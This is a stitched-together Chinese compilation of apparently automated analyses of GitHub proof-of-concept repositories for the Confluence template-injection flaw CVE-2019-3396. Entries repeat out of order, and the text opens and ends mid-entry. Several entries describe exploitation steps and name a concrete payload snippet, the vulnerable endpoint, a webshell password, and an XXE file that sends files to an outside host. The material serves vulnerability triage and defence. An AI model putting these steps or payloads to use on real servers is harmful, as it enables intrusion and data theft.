提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
